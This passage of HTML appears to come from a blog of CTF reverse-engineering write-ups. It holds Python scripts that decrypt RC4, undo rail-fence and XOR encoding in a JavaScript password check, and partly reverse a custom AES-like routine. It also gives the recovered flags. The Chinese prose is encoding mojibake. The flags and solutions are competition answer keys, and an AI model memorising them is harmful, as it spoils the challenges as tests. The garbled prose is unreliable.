class="headerlink" title="å¯»æ‰¾åˆéŸ³æœªæ¥"></a>å¯»æ‰¾åˆéŸ³æœªæ¥</h3><blockquote><p>æ­£ç¡®çš„è¾“å…¥å³å¯è§£æ•‘Miku~(å›¾æœ‰ç‚¹å¤§äº†å¿ä¸€ä¸‹)</p></blockquote><p>Goç¨‹åºï¼Œä»£ç é€»è¾‘ä¸ºRC4ï¼ŒåŠ¨è°ƒå¾— <code>key=&#39;C&#39;*18</code>ã€‚</p><p>è¾“å…¥é—®é¢˜ <code>åˆéŸ³æœªæ¥è‰²æ˜¯å¤šå°‘?(è¾“å…¥ä¸º16è¿›åˆ¶,å¦‚0x123abcåˆ™è¾“å…¥123abc)</code> ç­”æ¡ˆ <code>39C5BB</code>ï¼Œæå–å¯†æ–‡ï¼ŒRC4è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">256</span></span><br><span class="line">S = [<span class="number">0</span>] * N</span><br><span class="line">key = <span class="string">&#x27;C&#x27;</span>*<span class="number">18</span></span><br><span class="line">Key = [<span class="number">0</span>] * N</span><br><span class="line"></span><br><span class="line">t = [ <span class="number">0x25</span>, <span class="number">0x6F</span>, <span class="number">0x3D</span>, <span class="number">0x6C</span>, <span class="number">0xF9</span>, <span class="number">0xE0</span>, <span class="number">0xCF</span>, <span class="number">0x3F</span>, <span class="number">0x2E</span>, <span class="number">0x24</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0x7B</span>, <span class="number">0x81</span>, <span class="number">0xBF</span>, <span class="number">0x55</span>, <span class="number">0x4F</span>, <span class="number">0x0D</span>, <span class="number">0x99</span>, <span class="number">0x87</span>, <span class="number">0x47</span>, </span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0xF7</span>, <span class="number">0xB9</span>, <span class="number">0x98</span>, <span class="number">0xFB</span>, <span class="number">0x1B</span>, <span class="number">0x22</span>, <span class="number">0xEC</span>, <span class="number">0x84</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0xFD</span>, <span class="number">0xB2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">	S[i] = i</span><br><span class="line">	Key[i] = <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">	j = (j + S[i] + Key[i]) % N</span><br><span class="line">	S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">	i = (i + <span class="number">1</span>) % N</span><br><span class="line">	j = (j + S[i]) % N</span><br><span class="line">	S[i], S[j] = S[j], S[i]</span><br><span class="line">	t[k] ^= S[(S[i] + S[j]) % N]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;N0thing_1s_sEriOus_But_MIku&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="æµªæ¼«è‡³æ­»ä¸æ¸"><a href="#æµªæ¼«è‡³æ­»ä¸æ¸" class="headerlink" title="æµªæ¼«è‡³æ­»ä¸æ¸"></a>æµªæ¼«è‡³æ­»ä¸æ¸</h3><blockquote><p>æŸå¸ˆå‚…æƒ³ç»™ä»–çš„å¥³ç¥è¡¨ç™½ï¼Œä»–å†™äº†ä¸€ä¸ªç½‘ç«™ï¼Œç‚¹çˆ±å¿ƒä¹‹åå°±èƒ½è¾“å…¥å¯†ç ï¼Œä½†æ˜¯åœ¨å†™çš„è¿‡ç¨‹ä¸­ä»–ä¸å°å¿ƒæŠŠæç¤ºçš„å¯†ç åˆ é™¤äº†ï¼Œä½ èƒ½å¸®ä»–æ‰¾å‡ºè¡¨ç™½å¯†ç å—ï¼Ÿ(è¾“å…¥å¯†ç æ—¶ï¼Œè®°å¾—åˆ·æ–°å–”ï¼‰ ps:è¯·å°†å¯†ç åŒ…è£¹SYC{}ä¸Šäº¤ï¼Œä¸”å°†å­—æ¯å…¨æ”¹ä¸ºå¤§å†™</p></blockquote><p>jsæ–‡ä»¶åŠ å¯†é€»è¾‘åˆ†æã€‚</p><p>keyä¸ºText1ï¼Œé‡‡ç”¨äº†æ …æ å¯†ç åŠ å¯†å¾—åˆ° <code>53X211WH04N</code>ï¼Œåˆ©ç”¨ç°æœ‰çš„ <code>decryptRailFence()</code> å‡½æ•°è§£å¯†ï¼š</p><p><code>decryptRailFence(&#39;53X211WH04N&#39;,3)=&#39;5201314WXHN&#39;</code></p><p>å¯†æ–‡ä¸ºï¼š<code>125, 130, 131, 122, 117, 110, 123, 125, 130, 131, 122, 117, 110, 123, 99, 99, 99, 99</code></p><p>åŠ å¯†é€»è¾‘ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i&lt;14 æ—¶ï¼šc[i]=(m[i]^k[i%7])+10</span><br><span class="line">i&gt;=14 æ—¶ï¼šc[i]=(m[i]^k[i-7])+99</span><br></pre></td></tr></table></figure><p>è¿˜åŸæ˜æ–‡ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>]</span><br><span class="line">k = <span class="built_in">list</span>(<span class="string">b&#x27;5201314WXHN&#x27;</span>)</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">14</span>:</span><br><span class="line">        m.append((c[i]-<span class="number">10</span>)^k[i%<span class="number">7</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m.append((c[i]-<span class="number">99</span>)^k[i-<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;FJIAXUEFJIAXUEWXHN&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>SYC&#123;FJIAXUEFJIAXUEWXHN&#125;</code></p><p>â€‹</p><h3 id="AES-AES"><a href="#AES-AES" class="headerlink" title="AES! AES?"></a>AES! AES?</h3><blockquote><p>Whatâ€™s this ?</p></blockquote><p>ç…§é€»è¾‘å°è¯•é€†å‘å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">v17 = [<span class="number">224</span>, -<span class="number">251</span>, -<span class="number">146</span>, -<span class="number">62</span>, -<span class="number">146</span>, -<span class="number">103</span>, -<span class="number">152</span>, <span class="number">69</span>, -<span class="number">131</span>, -<span class="number">225</span>, -<span class="number">193</span>, -<span class="number">7</span>, -<span class="number">105</span>, -<span class="number">138</span>, <span class="number">59</span>, <span class="number">146</span>, <span class="number">47</span>, -<span class="number">188</span>, -<span class="number">250</span>, -<span class="number">153</span>, -<span class="number">88</span>, -<span class="number">21</span>, -<span class="number">20</span>, <span class="number">74</span>, -<span class="number">145</span>, -<span class="number">24</span>, -<span class="number">203</span>, -<span class="number">7</span>, -<span class="number">84</span>, -<span class="number">89</span>, <span class="number">140</span>, <span class="number">113</span>]</span><br><span class="line">c = [k&amp;<span class="number">0xff</span> <span class="keyword">for</span> k <span class="keyword">in</span> v17]</span><br><span class="line"></span><br><span class="line">v16 = [<span class="number">110</span>, <span class="number">121</span>, <span class="number">105</span>, <span class="number">131</span>, <span class="number">121</span>, <span class="number">127</span>, <span class="number">105</span>, <span class="number">117</span>, <span class="number">121</span>, <span class="number">120</span>, </span><br><span class="line">  <span class="number">129</span>, <span class="number">105</span>, <span class="number">93</span>, <span class="number">99</span>, <span class="number">77</span>, <span class="number">73</span>]</span><br><span class="line"></span><br><span class="line">v13 = [<span class="number">122</span>, <span class="number">118</span>, <span class="number">107</span>, <span class="number">109</span>, <span class="number">111</span>,  <span class="number">42</span>, <span class="number">115</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">127</span>, </span><br><span class="line">  <span class="number">126</span>,  <span class="number">42</span>, <span class="number">131</span>, <span class="number">121</span>, <span class="number">127</span>, <span class="number">124</span>,  <span class="number">42</span>, <span class="number">112</span>, <span class="number">118</span>, <span class="number">107</span>, </span><br><span class="line">  <span class="number">113</span>,  <span class="number">68</span>,  <span class="number">42</span>,  <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">v14 = v15 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">v10 = [<span class="number">131</span>, <span class="number">111</span>, <span class="number">125</span>,  <span class="number">43</span>,  <span class="number">42</span>, <span class="number">131</span>, <span class="number">121</span>, <span class="number">127</span>,  <span class="number">42</span>, <span class="number">107</span>, </span><br><span class="line">  <span class="number">124</span>, <span class="number">111</span>,  <span class="number">42</span>, <span class="number">124</span>, <span class="number">115</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">126</span>,  <span class="number">43</span>,  <span class="number">20</span>, </span><br><span class="line">   <span class="number">10</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">136</span>, <span class="number">126</span>, <span class="number">124</span>, <span class="number">131</span>,  <span class="number">42</span>, <span class="number">107</span>, <span class="number">113</span>, </span><br><span class="line">  <span class="number">107</span>, <span class="number">115</span>, <span class="number">120</span>, <span class="number">136</span>,  <span class="number">20</span>,  <span class="number">10</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">136</span>,  <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">S = [<span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>,  <span class="number">48</span>,   <span class="number">1</span>, </span><br><span class="line">  <span class="number">103</span>,  <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">125</span>, </span><br><span class="line">  <span class="number">250</span>,  <span class="number">89</span>,  <span class="number">71</span>, <span class="number">240</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">164</span>, </span><br><span class="line">  <span class="number">114</span>, <span class="number">192</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">147</span>,  <span class="number">38</span>,  <span class="number">54</span>,  <span class="number">63</span>, <span class="number">247</span>, <span class="number">204</span>, </span><br><span class="line">   <span class="number">52</span>, <span class="number">165</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">113</span>, <span class="number">216</span>,  <span class="number">49</span>,  <span class="number">21</span>,   <span class="number">4</span>, <span class="number">199</span>, </span><br><span class="line">   <span class="number">35</span>, <span class="number">195</span>,  <span class="number">24</span>, <span class="number">150</span>,   <span class="number">5</span>, <span class="number">154</span>,   <span class="number">7</span>,  <span class="number">18</span>, <span class="number">128</span>, <span class="number">226</span>, </span><br><span class="line">  <span class="number">235</span>,  <span class="number">39</span>, <span class="number">178</span>, <span class="number">117</span>,   <span class="number">9</span>, <span class="number">131</span>,  <span class="number">44</span>,  <span class="number">26</span>,  <span class="number">27</span>, <span class="number">110</span>, </span><br><span class="line">   <span class="number">90</span>, <span class="number">160</span>,  <span class="number">82</span>,  <span class="number">59</span>, <span class="number">214</span>, <span class="number">179</span>,  <span class="number">41</span>, <span class="number">227</span>,  <span class="number">47</span>, <span class="number">132</span>, </span><br><span class="line">   <span class="number">83</span>, <span class="number">209</span>,   <span class="number">0</span>, <span class="number">237</span>,  <span class="number">32</span>, <span class="number">252</span>, <span class="number">177</span>,  <span class="number">91</span>, <span class="number">106</span>, <span class="number">203</span>, </span><br><span class="line">  <span class="number">190</span>,  <span class="number">57</span>,  <span class="number">74</span>,  <span class="number">76</span>,  <span class="number">88</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">170</span>, <span class="number">251</span>, </span><br><span class="line">   <span class="number">67</span>,  <span class="number">77</span>,  <span class="number">51</span>, <span class="number">133</span>,  <span class="number">69</span>, <span class="number">249</span>,   <span class="number">2</span>, <span class="number">127</span>,  <span class="number">80</span>,  <span class="number">60</span>, </span><br><span class="line">  <span class="number">159</span>, <span class="number">168</span>,  <span class="number">81</span>, <span class="number">163</span>,  <span class="number">64</span>, <span class="number">143</span>, <span class="number">146</span>, <span class="number">157</span>,  <span class="number">56</span>, <span class="number">245</span>, </span><br><span class="line">  <span class="number">188</span>, <span class="number">182</span>, <span class="number">218</span>,  <span class="number">33</span>,  <span class="number">16</span>, <span class="number">255</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">205</span>,  <span class="number">12</span>, </span><br><span class="line">   <span class="number">19</span>, <span class="number">236</span>,  <span class="number">95</span>, <span class="number">151</span>,  <span class="number">68</span>,  <span class="number">23</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">126</span>,  <span class="number">61</span>, </span><br><span class="line">  <span class="number">100</span>,  <span class="number">93</span>,  <span class="number">25</span>, <span class="number">115</span>,  <span class="number">96</span>, <span class="number">129</span>,  <span class="number">79</span>, <span class="number">220</span>,  <span class="number">34</span>,  <span class="number">42</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">136</span>,  <span class="number">70</span>, <span class="number">238</span>, <span class="number">184</span>,  <span class="number">20</span>, <span class="number">222</span>,  <span class="number">94</span>,  <span class="number">11</span>, <span class="number">219</span>, </span><br><span class="line">  <span class="number">224</span>,  <span class="number">50</span>,  <span class="number">58</span>,  <span class="number">10</span>,  <span class="number">73</span>,   <span class="number">6</span>,  <span class="number">36</span>,  <span class="number">92</span>, <span class="number">194</span>, <span class="number">211</span>, </span><br><span class="line">  <span class="number">172</span>,  <span class="number">98</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">231</span>, <span class="number">200</span>,  <span class="number">55</span>, <span class="number">109</span>, </span><br><span class="line">  <span class="number">141</span>, <span class="number">213</span>,  <span class="number">78</span>, <span class="number">169</span>, <span class="number">108</span>,  <span class="number">86</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">101</span>, <span class="number">122</span>, </span><br><span class="line">  <span class="number">174</span>,   <span class="number">8</span>, <span class="number">186</span>, <span class="number">120</span>,  <span class="number">37</span>,  <span class="number">46</span>,  <span class="number">28</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">198</span>, </span><br><span class="line">  <span class="number">232</span>, <span class="number">221</span>, <span class="number">116</span>,  <span class="number">31</span>,  <span class="number">75</span>, <span class="number">189</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">112</span>,  <span class="number">62</span>, </span><br><span class="line">  <span class="number">181</span>, <span class="number">102</span>,  <span class="number">72</span>,   <span class="number">3</span>, <span class="number">246</span>,  <span class="number">14</span>,  <span class="number">97</span>,  <span class="number">53</span>,  <span class="number">87</span>, <span class="number">185</span>, </span><br><span class="line">  <span class="number">134</span>, <span class="number">193</span>,  <span class="number">29</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">152</span>,  <span class="number">17</span>, <span class="number">105</span>, <span class="number">217</span>, </span><br><span class="line">  <span class="number">142</span>, <span class="number">148</span>, <span class="number">155</span>,  <span class="number">30</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">206</span>,  <span class="number">85</span>,  <span class="number">40</span>, <span class="number">223</span>, </span><br><span class="line">  <span class="number">140</span>, <span class="number">161</span>, <span class="number">137</span>,  <span class="number">13</span>, <span class="number">191</span>, <span class="number">230</span>,  <span class="number">66</span>, <span class="number">104</span>,  <span class="number">65</span>, <span class="number">153</span>, </span><br><span class="line">   <span class="number">45</span>,  <span class="number">15</span>, <span class="number">176</span>,  <span class="number">84</span>, <span class="number">187</span>,  <span class="number">22</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    v13[i] -= <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(v13))</span><br><span class="line"><span class="comment"># v13 = b&#x27;place inout your flag: \n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    v10[i] -= <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(v10))</span><br><span class="line"><span class="comment"># v10 = b&#x27;yes! you are right!\n\x00&#x27;</span></span><br><span class="line"><span class="comment"># v11 = b&#x27;no~try again~\n\x00&#x27;</span></span><br><span class="line"><span class="comment"># v12 = b&#x27;no~\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># len(s) == 32</span></span><br><span class="line"></span><br><span class="line">v7 = [k-<span class="number">10</span> <span class="keyword">for</span> k <span class="keyword">in</span> v16]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(v7))</span><br><span class="line"><span class="comment"># v16 = v7 = b&#x27;do_you_konw_SYC?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s[5] = 46</span></span><br><span class="line"><span class="comment"># s[10] = 108</span></span><br><span class="line"><span class="comment"># s[17] = 48</span></span><br><span class="line"></span><br><span class="line">v18 = [<span class="number">100</span>, <span class="number">111</span>,  <span class="number">95</span>, <span class="number">121</span>, <span class="number">111</span>, <span class="number">117</span>,  <span class="number">95</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">110</span>, </span><br><span class="line">  <span class="number">119</span>,  <span class="number">95</span>,  <span class="number">83</span>,  <span class="number">89</span>,  <span class="number">67</span>,  <span class="number">63</span>,  <span class="number">39</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>,  <span class="number">20</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, </span><br><span class="line">   <span class="number">89</span>,  <span class="number">74</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, </span><br><span class="line">  <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, </span><br><span class="line">  <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, </span><br><span class="line">  <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, </span><br><span class="line">  <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, </span><br><span class="line">  <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, </span><br><span class="line">  <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, </span><br><span class="line">  <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>,  <span class="number">57</span>, <span class="number">144</span>, <span class="number">207</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, </span><br><span class="line">  <span class="number">146</span>, <span class="number">156</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------------------------------</span></span><br><span class="line"><span class="comment"># encrypt </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ShiftRow</span>(<span class="params">A</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(math.ceil(i/<span class="number">4</span>)):</span><br><span class="line">            A[i],A[i+<span class="number">1</span>],A[i+<span class="number">2</span>],A[i+<span class="number">3</span>] = A[i+<span class="number">1</span>],A[i+<span class="number">2</span>],A[i+<span class="number">3</span>],A[i]</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">A</span>):</span><br><span class="line">    tmp = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        tmp[i] = A[i]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            A[x] = tmp[<span class="number">4</span>*k+j]</span><br><span class="line">            A[x] = S[A[x]]</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;abcde.ghijllmnopq0stuvwxyz123457&#x27;</span>)</span><br><span class="line">v = [S[s[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">v = 